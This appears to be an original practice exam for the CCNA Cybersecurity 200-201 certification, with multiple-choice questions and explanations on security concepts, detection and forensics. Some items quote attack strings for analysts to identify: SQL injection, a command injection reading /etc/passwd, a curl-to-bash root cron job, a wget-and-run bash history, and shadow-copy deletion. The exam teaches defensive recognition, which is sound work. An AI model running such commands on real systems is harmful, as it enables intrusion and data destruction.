title: CCNA Cybersecurity 200-201 (v1.2) practice exam
note: Original questions written for MyNextCert from Cisco's public 200-201 CCNACBR v1.2 exam topics (July 2025). Not real exam questions. Cisco doesn't publish the number of items on the real exam; this is a 100-item stand-in in 120 minutes with 4 drag-and-drop style items.

q.q: Ransomware encrypts a hospital's file server. Logs show no data left the network. Staff can't open any patient files. Which part of the CIA triad was hit MOST directly?
o: Availability
Right. The data still exists and wasn't read by outsiders, but nobody can use it.
Confidentiality
Nothing was read or taken, so secrecy held.
Integrity
The files were changed, but the main harm here is that no one can reach them.
Non-repudiation
Non-repudiation is about proving who did something. It isn't part of the CIA triad.

q.q: A file integrity tool reports that the SHA-256 hash of a router's saved config changed overnight. No change ticket exists. Which property is the tool protecting?
o: Integrity
Right. A changed hash means the data was altered, and no approved change explains it.
Availability
The config is still there and readable.
Confidentiality
A hash check shows change, not who read the file.
Authentication
Authentication proves identity. The tool is checking the data itself.

q.q: A laptop with an unencrypted disk is stolen from a car. It held a spreadsheet of employee home addresses. Which CIA principle is at risk?
o: Confidentiality
Right. Anyone with the laptop can read the data.
Integrity
Nobody has changed the original records.
Availability
The company still has the records on its servers.
Accountability
Accountability tracks actions to people. The risk here is exposure.

q.q: A tool gets an alert from the SIEM, looks up the source IP's reputation, blocks it on the firewall and opens a ticket, all without a person. What is this tool?
o: SOAR
Right. Security orchestration, automation and response runs playbooks across tools.
Log management
Log management collects and stores logs. It doesn't act.
A legacy antivirus
Antivirus scans files on one host.
NetFlow collector
NetFlow records traffic. It doesn't block or open tickets.

q.q: Which is an example of an AGENTLESS protection?
o: A network IPS with nothing installed on hosts
Right. Agentless tools work from outside the endpoint, often on the network.
An EDR sensor installed on every laptop
Installed software on each host is agent-based.
A host firewall managed by a central console
A host firewall runs on the endpoint itself.
Antimalware with a local signature database on each PC
Local antimalware is agent software on the host.

q.q: A fileless attack runs PowerShell straight in memory and never writes an executable to disk. Why is LEGACY antivirus likely to miss it?
o: It mostly matches known file signatures on disk
Right. Classic antivirus scans files for known patterns. Code that lives only in memory gives it little to match.
It only scans while no user is logged on to the computer
Antivirus runs all the time, not only when users log off.
It can't scan files larger than 10 MB
File size isn't why it misses memory-only code.
It needs a SIEM before it can raise alerts
Antivirus raises its own alerts without a SIEM.

q.q: Ten containers run on one Linux host. Compared with ten virtual machines, what is the main extra risk?
o: They share one kernel, so a kernel flaw hits all
Right. Containers isolate processes but use one kernel. VMs each have their own kernel behind a hypervisor.
They can't use encryption for network traffic
Containers can use TLS like any other workload.
Each container needs its own separate hypervisor to run
Containers don't use a hypervisor per container.
Their logs can't be sent to a SIEM
Container logs can be shipped to a SIEM.

q.q: Your team rents IaaS virtual machines in a public cloud. Under the shared responsibility model, who patches the guest operating system?
o: Your team, the customer
Right. In IaaS the provider secures the physical hosts and hypervisor. The customer owns the guest OS and up.
The cloud provider
The provider stops at the hypervisor in IaaS.
Nobody, cloud VMs patch themselves
Cloud VMs don't patch themselves unless you set that up.
The OS vendor, directly
The vendor releases patches. Someone still has to apply them.

q.q: An analyst starts with the idea that attackers may be using scheduled tasks for persistence. She searches every host for unusual tasks, even though no alert fired. What is she doing?
o: Threat hunting
Right. Hunting is a proactive, hypothesis-driven search for threats that slipped past detection.
Reverse engineering
Reverse engineering takes apart a program to learn how it works.
Run book automation
Run book automation runs set steps automatically.
Threat modeling
Threat modeling maps how a system could be attacked, usually during design.

q.q: A detector compares the last 15 minutes of login failures with a baseline, then moves forward one minute and compares again. What technique is this?
o: Sliding window anomaly detection
Right. A moving time window is compared with normal behavior to spot spikes.
Signature matching
Signatures look for known patterns, not changes against a baseline.
Sandbox detonation
A sandbox runs a file to watch what it does.
Threat intelligence
Threat intel is knowledge about threats, not a counting method.

q.q: Every code commit now triggers a dependency scan and a static code scan before it can be merged. Which practice does this show?
o: DevSecOps
Right. Security checks are built into the development pipeline.
Malware analysis
Nothing here studies malicious code.
Threat hunting
Hunting searches live systems for attackers.
Reverse engineering
The team is checking its own code, not taking apart someone else's.

q.q: A web server runs an unpatched Apache Struts version. A script on GitHub sends a crafted request that runs commands on it. What is the script?
o: An exploit
Right. An exploit is the code or method that takes advantage of a weakness.
A vulnerability
The unpatched flaw is the vulnerability. The script uses it.
A threat
A threat is the actor or event that could cause harm.
A risk
Risk is the chance and impact of harm, not the tool.

q.q: Two servers have the same critical flaw. One is internal and holds test data. The other faces the internet and stores patient records. Why is the second server's risk higher?
o: Both the likelihood and the impact are higher
Right. Risk weighs how likely an attack is and how bad the result would be.
The vulnerability is more severe on that server
It's the same flaw on both.
Internal servers can't be attacked
Internal servers can be reached by insiders or after a breach.
Only the exploit code differs
The same exploit works on both.

q.q: Which of these is a THREAT, not a vulnerability?
o: A ransomware group that targets hospitals
Right. A threat is an actor or event that could exploit a weakness.
A default admin password on a camera
A default password is a weakness, so it's a vulnerability.
A missing security patch on an internet-facing server
A missing patch is a vulnerability.
An open SMB port on a public server
An exposed service is a weakness or part of the attack surface.

q.q: A phishing email gets past the email filter. The user opens the attachment, but the endpoint agent blocks the payload. Which principle worked here?
o: Defense in depth
Right. When one layer failed, another layer stopped the attack.
Least privilege
Least privilege limits rights. Nothing here was about rights.
Separation of duties
Separation of duties splits tasks between people.
Security through obscurity
Hiding details wasn't what stopped the attack.

q.q: Which setup BEST shows defense in depth?
o: Email filtering, EDR and segmentation
Right. Several different layers mean one failure isn't a breach.
One next-gen firewall with every feature turned on
One device is still a single point of failure, however many features it has.
Two identical firewalls from the same vendor, one after the other
Two copies of the same control often fail the same way.
Strong passwords required for every account
Strong passwords are one control, not layers.

q.q: A manager asks why the company still needs internal segmentation if the perimeter firewall is strong. What is the BEST answer?
o: No one control stops everything, so layers limit harm
Right. Defense in depth assumes a layer will fail and plans for it.
Segmentation makes the perimeter firewall faster
Segmentation doesn't speed up the perimeter firewall.
Firewalls can't inspect any traffic
Firewalls do inspect traffic. The issue is that no layer is perfect.
Auditors require it, but it adds no real security once the perimeter is strong
Segmentation slows lateral movement, so it adds real security.

q.q: Contractors can sign in only from 0700 to 1800 on weekdays. Logins outside that window are denied. Which access control model is this?
o: Time-based
Right. Access depends on the time of day or day of week.
Discretionary
Discretionary access lets the owner decide who gets in.
Mandatory
Mandatory access uses labels and clearances.
Role-based
Role decides the rights, but here the clock decides when.

q.q: An auditor asks which commands an admin ran on a core switch last Tuesday. Which part of AAA provides this?
o: Accounting
Right. Accounting records what a user did and when.
Authentication
Authentication proves who the admin is.
Authorization
Authorization decides which commands are allowed.
Auditing
Auditing reviews records, but AAA's third A that creates the records is accounting.

q.q: Access to payroll needs three things: Finance department, a company-managed device and a U.S. location. Which model fits BEST?
o: Attribute-based
Right. Several attributes of the user, device and place decide access.
Role-based
Role is only one of the three factors here.
Discretionary
No owner is choosing who gets in.
Rule-based
Rule-based applies one rule to everyone, not a mix of user attributes.

q.q: A flaw can be exploited only by someone on the same local network segment, for example the same Wi-Fi. Which CVSS Attack Vector value fits?
o: Adjacent
Right. Adjacent means the attacker must share a local network with the target.
Network
Network means reachable across routers, even from the internet.
Local
Local needs access to the system itself, like a shell.
Physical
Physical means touching the device.

q.q: An exploit lets code in a guest VM take over the hypervisor and every other VM on that host. Which CVSS metric reflects this?
o: Scope: Changed
Right. The impact reaches past the vulnerable part into other components.
Attack Complexity: High
Complexity is about how hard the attack is, not how far it spreads.
User Interaction: Required
Nobody had to click anything.
Privileges Required: None
That measures needed rights, not how far the damage spreads.

q.q: A flaw's base score is 7.5. A week later a working exploit shows up in a public exploit kit. Which CVSS metric group changes?
o: Temporal
Right. Temporal metrics track things that change over time, like exploit maturity and fixes.
Base
Base metrics describe the flaw itself and don't change over time.
Environmental
Environmental metrics reflect your own systems and needs.
Impact subscore
The impact on CIA hasn't changed.

q.q: Two VMs on the same host talk to each other. The traffic never leaves the virtual switch. Why can't the data center's physical IDS see it?
o: The traffic never crosses the physical sensor
Right. East-west traffic inside one host stays on the virtual switch.
VMs always encrypt traffic between them
VMs don't encrypt by default.
The IDS ignores private IP addresses
IDSs inspect private addresses all the time.
Virtual switches throw away all of their traffic logs
Logs aren't the issue. The packets never reach the sensor.

q.q: Remote staff use a split-tunnel VPN. Traffic to SaaS apps goes straight to the internet from home. What visibility problem does this create?
o: Corporate sensors never see the SaaS traffic
Right. Only some traffic crosses the VPN, so the rest skips company monitoring.
The VPN can't encrypt corporate traffic
Split tunneling still encrypts what goes over the VPN.
Users can no longer reach any internal servers at all
Internal traffic still goes through the tunnel.
SaaS apps stop logging users in
SaaS sign-in isn't affected.

q.q: The company moves to TLS 1.3 on every internal web app. The network IDS raises far fewer web attack alerts. What is the MOST likely reason?
o: The IDS can't read encrypted payloads
Right. Encryption hides content from tools that don't decrypt it.
TLS 1.3 blocks all web attacks
TLS protects data in transit. It doesn't stop SQL injection inside the tunnel.
The attackers have stopped
Fewer alerts after a visibility change usually means less seen, not less happening.
TLS 1.3 turns off request logging on every web server
Web servers still log requests.

q.q: A workstation that normally uploads a few MB a day sends 6 GB to an unfamiliar cloud storage IP at 02:30. What should an analyst suspect FIRST?
o: Data exfiltration
Right. A big jump in outbound data at an odd time to a new place is a classic loss sign.
A failed Windows update
Updates download data. They don't upload gigabytes.
A DHCP lease renewal
DHCP uses tiny packets.
Normal web browsing
Browsing mostly downloads, and this host rarely uploads.

q.q: One host makes thousands of DNS queries an hour for long random names under one domain, like 4f9a2c...e1.example-cdn.net. What is the MOST likely cause?
o: DNS tunneling
Right. Long, random, unique subdomains are a common way to sneak data out over DNS.
A misconfigured DHCP scope on the local subnet
DHCP problems don't create random DNS names.
A browser loading many images
Images come from a few names, not thousands of random ones.
Normal time synchronization
NTP doesn't make DNS queries like these.

q.q: Which traffic profile change MOST suggests data loss from a file server?
o: It now sends far more out than in, to an outside host
Right. A server suddenly sending far more out than it takes in, to an outside place, is a warning sign.
It answers many more SMB requests from internal users each morning
More internal use is normal for a file server.
Its backup job finishes ten minutes later
A slower backup isn't a loss sign by itself.
It gets more ARP requests from the gateway
ARP traffic is local and tiny.

q.q: Which set makes up the 5-tuple used to group logs about one connection?
o: Source IP, destination IP, source port, destination port, protocol
Right. These five values identify a single flow.
Source MAC, destination MAC, VLAN ID, destination port, protocol
MAC addresses and VLAN aren't part of the 5-tuple.
Source IP, user name, host name, timestamp, protocol
User and host names come from other logs.
Destination IP, URL, user agent, port, bytes
These are web log fields, not the 5-tuple.

q.q: A firewall log shows 203.0.113.10:44123 > 198.51.100.7:443 TCP. 203.0.113.10 is the PAT address shared by 400 internal hosts. How do you find the infected host?
o: Match the translated port and time in the NAT log
Right. With PAT, the translated port plus the time ties back to one inside IP and port.
Block 203.0.113.10 at the firewall
That would cut off all 400 hosts and still not find the one.
Search DHCP logs for 203.0.113.10
DHCP hands out inside addresses, not the shared public one.
Run a ping sweep of the whole inside network to find live hosts
Pinging doesn't show which host made the connection.

q.q: An IDS alert, a proxy log and a NetFlow record all mention the same connection. Which step lets you join them to one inside host?
o: Match the 5-tuple and time in all three
Right. The same five values at the same time tie events from different tools to one flow.
Search the proxy log for the IDS alert's signature ID
The proxy doesn't know the IDS signature.
Sort all three logs by user name
NetFlow has no user names.
Compare each source's severity rating
Severity doesn't identify the connection.

q.q: A brand-new malware family uses a protocol nobody has seen. Which detection approach is MORE likely to catch it on day one?
o: Behavioral, against a baseline
Right. Behavior and statistics can flag something unusual even without a known pattern.
Signature-based
No signature exists yet for something nobody has seen.
Hash blocklist
The hash isn't on any list yet.
Rule-based IDS with current rules
Rules are written for known traffic.

q.q: What is the main DOWNSIDE of statistical and behavioral detection compared with rules?
o: More false positives until the baseline is tuned
Right. Normal but unusual activity can look like an attack until the baseline is learned.
It can never detect new attacks
Detecting new attacks is its strength.
It needs a new signature written for each new attack it sees
That describes rule-based detection.
It can't run on network traffic
Behavioral analytics run on network data all the time.

q.q: A Snort rule alerts when a packet to TCP 445 contains a specific byte string. What kind of detection is this?
o: Rule-based, using a signature
Right. It matches a known, defined pattern.
Statistical anomaly detection
No baseline or statistics are used.
Behavioral analytics
It doesn't learn what's normal.
Predictive AI
A fixed byte match isn't a learning model.

q.q: The team closes unused ports, removes an old FTP service and retires two public test sites. What did they reduce?
o: The attack surface
Right. Fewer reachable services and entry points means less for an attacker to try.
The number of CVEs in the remaining software
The software left behind still has the same flaws.
The CVSS base scores
Base scores describe each flaw and don't change.
The threat actors' skills
Nothing here affects the attackers.

q.q: Which of these is a VULNERABILITY rather than just part of the attack surface?
o: An unpatched buffer overflow in the VPN service
Right. A specific, exploitable weakness is a vulnerability.
The VPN service listening on UDP 443
A listening service is an entry point. It's attack surface.
Employees who can receive email from outside the company
People who get email are part of the attack surface.
A public API that partners call
An exposed API is attack surface until a weakness is found.

q.q: A company launches a new public mobile API. A scan finds no known vulnerabilities. Which statement is TRUE?
o: The attack surface grew anyway
Right. Every new reachable service adds surface, flawed or not.
Risk stays the same because there are no CVEs
Unknown flaws and misuse still add risk.
Attack surface only counts internal systems
Public-facing services are a big part of the attack surface.
A clean scan means the API can't be attacked by anyone
Scanners only find what they know to look for.

q.q: An analyst needs the exact body of an HTTP POST sent by a suspect host. Which source can provide it?
o: A full packet capture made with tcpdump
Right. A capture keeps the whole packet, payload included, if it isn't encrypted.
NetFlow records
NetFlow keeps addresses, ports, times and byte counts, not payloads.
Stateful firewall connection logs for that host
These log the connection, not the content.
DHCP server logs
DHCP logs show address leases only.

q.q: A firewall blocks BitTorrent even though it runs over TCP 443, and it logs the user's AD name. What kind of firewall is it?
o: Next-generation firewall
Right. NGFWs identify applications and users, not just ports.
Traditional stateful firewall
A stateful firewall tracks sessions by IP and port. It can't tell BitTorrent from HTTPS on 443.
Stateless packet filter
A packet filter only checks header fields like ports.
NetFlow exporter
NetFlow records traffic. It doesn't block it.

q.q: A log line reads: user=jdoe url=hxxp://bet-now[.]example category=Gambling action=block. Which technology wrote it?
o: Web content filtering
Right. URL categories and block actions come from web filtering.
Email content filtering
Email filters log senders, recipients and attachments.
NetFlow
NetFlow has no URLs or categories.
Host-based firewall
A host firewall logs ports and programs, not URL categories.

q.q: Web server logs show every request coming from 10.1.1.5, the load balancer. How can analysts see the real client IPs?
o: Log the X-Forwarded-For header
Right. The load balancer can pass the original client IP in a header.
Turn off TLS on the load balancer
Encryption isn't what hides the client IP.
Check the DHCP server for 10.1.1.5
That only tells you the load balancer's own address.
Ask the company's ISP for a copy of its NAT tables
Clients come from all over the internet, not one ISP.

q.q: An analyst sees a workstation connect to a known Tor entry node. What can network monitoring tell about the final destination?
o: Almost nothing
Right. Traffic is wrapped in layers and passed through several relays, so only the entry node is visible.
The full URL, from the TLS SNI field
The SNI belongs to the Tor link, not the final site.
The final destination, from the company's DNS logs
Tor clients resolve names inside the Tor network.
The destination, from the IP header
The IP header points at the entry node.

q.q: An outside IDS sits on the internet side of the edge router, which does PAT. An alert names 198.51.100.20 as the source of attacks. What problem does this cause?
o: All inside hosts share that IP, so the host is hidden
Right. PAT hides inside addresses behind one public IP.
The IDS can't read TCP headers after NAT
NAT changes addresses and ports, but headers are still readable.
PAT encrypts the traffic
PAT doesn't encrypt anything.
The IDS sees duplicate copies of each packet after translation
PAT doesn't duplicate packets.

q.q: A record says host A talked to host B on TCP 22 for 47 minutes and sent 3 MB. There are no payloads. Which data type is this?
o: Session data
Right. Session data summarizes a whole conversation: who, how long and how much.
Full packet capture
A full capture would include payloads.
Alert data
Nothing here was flagged by a rule.
Statistical data
Statistical data is aggregated across many sessions.

q.q: A proxy log shows each HTTP request with the matching response code and size: GET /login 200 4 KB. Which data type is this?
o: Transaction data
Right. Transaction data pairs each request with its response.
Session data
Session data covers the whole connection, not each request in it.
Metadata only
This is more than data about data. It records each exchange.
Full packet capture
No packets or payloads were kept.

q.q: A dashboard shows that average outbound traffic from the HR subnet is 40 Mbps at 10:00 on weekdays. Which data type is this?
o: Statistical data
Right. Averages and baselines across time are statistical data.
Alert data
No rule fired.
Transaction data
It doesn't show single requests and responses.
Full packet capture
No packets are stored here.

q.q: A server's connection table fills with half-open connections. Captures show thousands of SYNs from many spoofed IPs and no final ACKs. What attack is this?
o: SYN flood
Right. The attacker starts handshakes and never finishes them, using up the server's resources.
ARP spoofing
ARP spoofing poisons local address tables.
DNS tunneling
DNS tunneling hides data in DNS traffic.
Smurf attack
Smurf uses ICMP broadcasts, not TCP SYNs.

q.q: A victim gets huge DNS responses from thousands of open resolvers it never queried. The queries were sent with the victim's IP as the source. What is this?
o: A reflection and amplification DDoS
Right. Small spoofed queries cause big replies aimed at the victim.
DNS cache poisoning
Poisoning plants false records. It doesn't flood a victim.
A SYN flood
This uses DNS replies, not TCP handshakes.
DNS tunneling
Tunneling sneaks data out. It isn't a flood.

q.q: Users on one VLAN get certificate warnings. The ARP table on their PCs maps the gateway IP to a new MAC address that belongs to another PC. What is happening?
o: On-path attack by ARP spoofing
Right. Fake ARP replies send gateway traffic to the attacker's machine.
A DHCP starvation attack on the VLAN's DHCP server
DHCP starvation uses up the address pool. It doesn't change the gateway MAC.
A VLAN hopping attack
VLAN hopping reaches another VLAN. It doesn't fake the gateway.
A DNS amplification attack
Amplification floods a victim with replies.

q.q: A login form gets this user name: admin' OR '1'='1' --. What is the attacker trying?
o: SQL injection
Right. The quote and OR clause try to change the database query so it always returns true.
Cross-site scripting
XSS injects script for browsers to run.
Command injection
Command injection targets the operating system shell.
Directory traversal
Traversal uses ../ to reach files.

q.q: A web page that pings a host gets this input: 8.8.8.8; cat /etc/passwd. The response includes the password file. What attack worked?
o: Command injection
Right. The semicolon ran a second OS command after ping.
SQL injection
No database query was changed.
Stored XSS
No script ran in a browser.
Cross-site request forgery
CSRF tricks a user's browser into sending a request.

q.q: An attacker posts a comment containing a script tag. Every user who later opens that page runs the script, which sends their session cookie to the attacker. What is this?
o: Stored cross-site scripting
Right. The script is saved on the site and runs in each visitor's browser.
Reflected cross-site scripting
Reflected XSS bounces off one crafted link. It isn't saved for every visitor.
SQL injection
The database stored the comment, but the attack runs in the browser.
Command injection
No server command ran.

q.q: An accounts payable clerk gets a call that sounds exactly like the CFO, asking for an urgent wire. The voice was cloned with AI. Which control BEST stops this?
o: Call back on a known number before any payment
Right. Out-of-band verification beats any voice or video, real or fake.
Check the caller ID
Caller ID is easy to spoof.
Ask the caller a question about the CFO's family
Public details are easy for attackers to learn.
Install a better spam filter
This came by phone, so an email filter doesn't help.

q.q: Training told staff to spot phishing by bad spelling. Attackers now use AI to write perfect emails. What should training stress INSTEAD?
o: Check the real domain and verify odd requests
Right. AI hides writing mistakes, but it can't fake a verified request or a real domain.
Delete any email with a link
That would block normal business.
Only distrust emails that are written in a foreign language
AI writes well in any language.
Trust emails that use your name
Attackers can personalize easily.

q.q: A phishing email targets only the CEO and board, using details from their public speeches. What is this called?
o: Whaling
Right. Whaling is spear phishing aimed at senior leaders.
Vishing
Vishing uses voice calls.
Smishing
Smishing uses text messages.
Pharming
Pharming sends users to fake sites by tampering with DNS.

q.q: Code writes 600 bytes into a 256-byte buffer on the stack and overwrites the return address. Which attack is this?
o: Buffer overflow
Right. Writing past the buffer changes where the program jumps next.
SQL injection
SQL injection targets database queries.
Race condition
A race condition depends on timing between processes.
Privilege escalation through a weak password
No password is involved.

q.q: A laptop contacts the same domain every 60 seconds with tiny, identical HTTPS requests, even when nobody is using it. What does this MOST likely show?
o: Command and control beaconing
Right. Regular, small check-ins with no user are a classic C2 sign.
A Windows Update download running in the background
Updates download large files, not tiny requests every minute.
Normal web browsing
Browsing is irregular and needs a user.
A DHCP renewal
DHCP renews rarely and doesn't use HTTPS.

q.q: On a file server, thousands of files are renamed to .locked within minutes and the command vssadmin delete shadows /all /quiet ran. What is happening?
o: Ransomware
Right. Mass renames plus deleting shadow copies to block recovery is classic ransomware.
A backup job
Backups don't rename files or delete shadow copies.
Disk defragmentation
Defrag doesn't rename files.
A failed patch install
Patches don't touch user files like this.

q.q: A process runs powershell.exe -NoP -W Hidden -EncodedCommand JABjAD0A... What is the attacker MOST likely doing?
o: Hiding the script with Base64 encoding
Right. EncodedCommand takes Base64, which hides the real commands from a quick look.
Encrypting the hard drive
Encoding a command isn't disk encryption.
Updating PowerShell
Updates don't run hidden, encoded commands.
Running a signed Microsoft maintenance script
Signed scripts don't need hidden windows or encoding.

q.q: Malware sends its C2 traffic over HTTPS to a popular cloud file-sharing site. Why is this hard to detect?
o: It's encrypted and looks like normal use
Right. Defenders rarely block popular services, and they can't see inside without decryption.
HTTPS traffic can't be logged
HTTPS connections are logged all the time. The content is what's hidden.
Cloud file-sharing services delete all of their access logs
The issue is blending in, not missing logs.
The traffic uses UDP
HTTPS normally runs over TCP.

q.q: An attacker reaches an internal server by sending traffic through a chain of compromised hosts, each relaying to the next. What does this mainly hide?
o: The attacker's real source
Right. Proxies and pivots make each hop look like the source.
The payload contents
Relaying alone doesn't encrypt the payload.
The destination port
The server still sees the port it's reached on.
The server's own IP address
The target's address isn't hidden by the chain.

q.q: To inspect HTTPS, a firewall decrypts and re-signs traffic. What must be done for users to avoid certificate warnings?
o: Trust the firewall's CA on every client
Right. Clients trust the re-signed certificates only if they trust the CA that issued them.
Turn off TLS 1.3 on all servers
Protocol version doesn't fix trust.
Give the firewall a copy of each website's private key
You can't get other sites' private keys.
Switch users to HTTP
That removes encryption altogether.

q.q: In TLS, why is asymmetric crypto used only at the start, with symmetric crypto for the rest of the session?
o: Asymmetric is slow, so it only sets up a key
Right. Public-key math protects the key exchange. Symmetric ciphers handle bulk data quickly.
Symmetric crypto can't encrypt web traffic
Symmetric ciphers encrypt nearly all TLS data.
Asymmetric keys expire after the first packet is sent
Key lifetime isn't the reason.
Symmetric crypto gives non-repudiation
Signatures, which are asymmetric, give non-repudiation.

q.q: How does a browser confirm that a server certificate really came from a trusted CA?
o: It checks the CA's signature with the CA's public key
Right. The CA signs with its private key. Anyone can verify with its public key.
It decrypts the certificate with the server's private key
The browser never has the server's private key.
It asks the server to send the CA's private key
A CA's private key is never shared.
It compares the certificate's size with a list
Size proves nothing about who signed it.

q.q: A TLS session uses TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384. Which part handles the key exchange?
o: ECDHE
Right. Elliptic-curve Diffie-Hellman Ephemeral sets up the shared key.
RSA
RSA authenticates the server here.
AES_256_GCM
AES-GCM encrypts the bulk data.
SHA384
SHA-384 is the hash used in the handshake.

q.q: An admin needs one file that holds a server certificate and its private key, protected by a password, to move to a new server. Which format fits?
o: PKCS #12 (.pfx/.p12)
Right. PKCS #12 bundles a certificate with its private key behind a password.
PKCS #10
PKCS #10 is a certificate signing request.
A DER-encoded .cer file
A .cer file holds the certificate only, not the private key.
PKCS #7 (.p7b)
PKCS #7 holds certificates and chains, not private keys.

q.q: A certificate for www.example.com is installed on shop.example.com. Browsers show a name mismatch. Which X.509 field needs shop.example.com added?
o: Subject Alternative Name
Right. Browsers check the hostname against the SAN list.
Issuer
The issuer is the CA, not the site.
Validity period
Dates don't cause a name mismatch.
Serial number
The serial number identifies the certificate, not the hostname.

q.q: A Linux server's agent alerts when /etc/passwd and /etc/sudoers change outside a maintenance window. Which tool is this?
o: A HIDS with file integrity monitoring
Right. A HIDS watches the host itself, including changes to key files.
A network IPS
A network IPS sees traffic, not file changes on a disk.
A host-based firewall with logging turned on
A host firewall filters connections. It doesn't watch files.
A NetFlow collector
NetFlow sees traffic records only.

q.q: A laptop on hotel Wi-Fi is outside the corporate firewall. Which control still blocks inbound SMB attempts from other guests?
o: A host-based firewall
Right. It runs on the laptop, so it protects it anywhere.
The perimeter NGFW
The laptop's traffic doesn't pass through it at the hotel.
A network IDS in the data center
It can't see the hotel network.
Web content filtering
Web filtering doesn't block inbound SMB.

q.q: An endpoint product flags a never-seen file as malicious. No signature matches; a model trained on millions of files scored its traits as likely malware. Which method is this?
o: Predictive AI (machine learning)
Right. A trained model predicts maliciousness from features, not exact patterns.
Signature matching
No signature matched.
Hash allowlisting
Allowlisting blocks anything not on a list. It doesn't score files.
Rule-based port filtering on the host
Port filtering doesn't look at files.

q.q: Malware rewrites its own code each time it spreads, so every copy has a new hash. Which detection method does this beat MOST easily?
o: Signature or hash-based antivirus
Right. Polymorphic code changes the patterns and hashes signatures depend on.
Behavioral monitoring
The malware still behaves the same way.
Sandbox detonation
A sandbox watches what the file does.
Predictive AI scoring
Models look at traits that survive small changes.

q.q: Process listing: svchost.exe, path C:\Users\Public\svchost.exe, parent explorer.exe. Why is this suspicious?
o: Real svchost runs from System32 under services.exe
Right. The wrong path and wrong parent both point to an impostor.
svchost.exe should never run on Windows
svchost.exe is a normal Windows process.
explorer.exe isn't allowed to start any other processes
Explorer starts the programs users open.
Public folders can't hold executables
They can, which is why attackers use them.

q.q: On an Ubuntu server, where should an analyst look FIRST for failed SSH logins?
o: /var/log/auth.log
Right. Debian and Ubuntu record authentication, including SSH, in auth.log.
/etc/shadow
shadow stores password hashes, not login events.
/var/log/dmesg
dmesg holds kernel messages.
/etc/hosts
hosts maps names to IP addresses.

q.q: A new value appears under HKCU\Software\Microsoft\Windows\CurrentVersion\Run pointing to %AppData%\upd.exe. What does this give the attacker?
o: It runs each time the user logs on
Right. Run keys are a common persistence spot.
Domain admin rights
A Run key doesn't grant rights.
A way to hide the file from antivirus scans
Run keys don't hide files.
Encryption for the user's files
It only starts a program at logon.

q.q: A line in /etc/crontab runs */5 * * * * root curl -s hxxp://203.0.113.9/x.sh | bash. What is this MOST likely?
o: Root persistence that reruns a downloaded script
Right. cron reruns the attacker's code on a schedule with root rights.
A normal package update job set up by the distribution
Package updates don't pipe a script from a raw IP into bash.
A log rotation task
Log rotation doesn't download scripts.
Time sync with an NTP server
NTP doesn't use curl or bash.

q.q: EDR sees a process open LSASS memory with read rights, the way credential dumpers do. No known-bad hash or IP is involved. What is this?
o: An indicator of attack
Right. IOAs describe attacker behavior while it's happening.
An indicator of compromise
IOCs are artifacts left after a compromise, like hashes or IPs.
Chain of custody
Chain of custody tracks evidence handling.
Threat attribution
Attribution is naming who did it.

q.q: A seized laptop moves from the analyst to a forensic lab. What does chain of custody require?
o: A record of who held it, when and why
Right. An unbroken record shows the evidence wasn't tampered with.
A copy of the laptop's warranty
Warranty info isn't part of custody.
A second analyst's written opinion of the findings and the lab
A review is useful, but it isn't custody.
A full wipe before transport
Wiping would destroy the evidence.

q.q: Malware in an intrusion has strings in Russian and code shared with a known group. Why should the analyst be careful naming that group?
o: Attackers reuse tools and plant false flags
Right. Shared code and language clues can be faked or borrowed.
Attribution is never useful
Attribution can guide defense. It just needs strong evidence.
Strings in malware are always encrypted
Many strings are readable, as here.
Only law enforcement may look at malware
Analysts look at malware every day.

q.q: Two alerts arrive at once: one on a domain controller, one on a kiosk PC. Why does knowing the ASSET matter for triage?
o: The DC's value makes its alert more urgent
Right. Asset value and role drive priority.
Kiosk PCs can't be attacked
Any device can be attacked.
Domain controllers don't log events
DCs log a great deal.
Asset details only matter after the incident has been closed
Asset context matters most during triage.

q.q: In court, the original hard drive pulled from the server is presented instead of a printout of its files. What type of evidence is the drive?
o: Best evidence
Right. Best evidence is the original, not a copy or summary.
Corroborative evidence
Corroborative evidence backs up other evidence.
Indirect evidence
Indirect evidence needs an inference to prove a fact.
Hearsay
Hearsay is a secondhand statement.

q.q: VPN logs show an account logged in at 23:10. Badge records show the same employee entered the building at 23:05. What role do the badge records play?
o: Corroborative evidence
Right. They support the VPN evidence from a separate source.
Best evidence
Best evidence is the original item itself.
Indirect evidence
They don't just imply the login. They back up the timeline.
Chain of custody
Custody tracks handling, not what the evidence shows.

q.q: A file was deleted using an account. The analyst concludes the account owner probably deleted it. What kind of evidence is the log?
o: Indirect (circumstantial) evidence
Right. It points to the owner only through inference. Someone else could have used the account.
Best evidence
Best evidence is the original item, not a conclusion about a person.
Corroborative evidence
Nothing else backs it up yet.
Direct evidence of who acted
A log shows the account, not the person at the keyboard.

q.q: Which is the BEST evidence in a malware case?
o: The hash-verified disk image
Right. An original or verified exact copy is best evidence.
An analyst's written summary of what the malware did
A summary is a description, not the evidence.
A screenshot of the antivirus alert
A screenshot is a copy of one view.
The user's memory of what happened
Recollection is weaker than the original data.

q.q: Windows Security log for one account: 30 events with ID 4625, then one 4624, all from 198.51.100.44 within two minutes. What happened?
o: A password-guessing attack that succeeded
Right. 4625 is a failed logon and 4624 a successful one.
The account was locked out
A lockout is event 4740.
The account was created
Account creation is event 4720.
The audit log was cleared
Clearing the log is event 1102.

q.q: Right after a suspicious admin logon, a server logs event ID 1102. Why does this matter?
o: Someone cleared the Security log
Right. 1102 means the audit log was cleared.
The server rebooted normally after installing updates
Reboots log other events, such as 6005 and 6006.
A user changed their password
Password changes are 4723 and 4724.
A scheduled task finished
Task events aren't 1102.

q.q: Apache log: 203.0.113.7 GET /item.php?id=5%20UNION%20SELECT%20username,password%20FROM%20users 200 18733. Normal responses are about 2,000 bytes. What does this suggest?
o: Successful SQL injection
Right. A UNION SELECT with a 200 and a much larger response points to success.
A failed cross-site scripting attempt
This is SQL, not script.
A normal product page view
Normal views don't carry UNION SELECT.
A blocked request
A 200 status means the server answered it.

q.q: A user's .bash_history shows: wget hxxp://198.51.100.3/k; chmod +x k; ./k &; history -c. What should the analyst conclude?
o: A file was fetched, run, and history wiped
Right. Download, make executable, run, then cover tracks.
The user installed an approved package from the repository
Approved packages come through the package manager, not raw IPs.
Only a directory listing was made
No ls command was run.
The commands failed
Nothing here shows a failure.

q.q: A sandbox report says the sample made a mutex, copied itself to %AppData%, added a Run key and queried 40 random-looking domains. What does the domain list suggest?
o: A DGA searching for C2
Right. Many random domains point to a DGA that searches for a live C2 server.
A normal software update check against the vendor's servers
Updaters contact a few fixed vendor domains.
Printer discovery
Printers aren't found through random internet domains.
A failed license check
License checks use one vendor server.

